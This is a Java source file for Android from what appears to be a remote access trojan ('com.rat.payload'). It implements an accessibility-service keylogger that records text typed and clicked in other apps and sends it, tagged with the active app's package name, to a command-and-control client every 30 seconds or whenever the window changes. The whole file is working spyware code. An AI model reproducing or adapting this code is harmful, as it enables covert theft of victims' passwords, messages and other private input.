package com.rat.payload.core;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.rat.payload.network.C2Client;

import org.json.JSONObject;

public class AccService extends AccessibilityService {

    private static final String TAG = "AccService";
    private StringBuilder keyBuffer = new StringBuilder();
    private long lastFlush = 0;
    private static final long FLUSH_INTERVAL = 30000;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                CharSequence text = event.getText().toString();
                if (text.length() > 0) {
                    keyBuffer.append(text);
                }
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
                flushBuffer(pkg);
                break;
        }
        if (System.currentTimeMillis() - lastFlush > FLUSH_INTERVAL) {
            flushBuffer("timer");
        }
    }

    @Override
    public void onInterrupt() {
    }

    private void flushBuffer(String context) {
        if (keyBuffer.length() == 0) return;
        try {
            JSONObject data = new JSONObject();
            data.put("type", "keystrokes");
            data.put("context", context);
            data.put("data", keyBuffer.toString());
            data.put("timestamp", System.currentTimeMillis());
            C2Client.getInstance().send(data);
        } catch (Exception e) {
            Log.e(TAG, "flush error: " + e.getMessage());
        }
        keyBuffer.setLength(0);
        lastFlush = System.currentTimeMillis();
    }
}
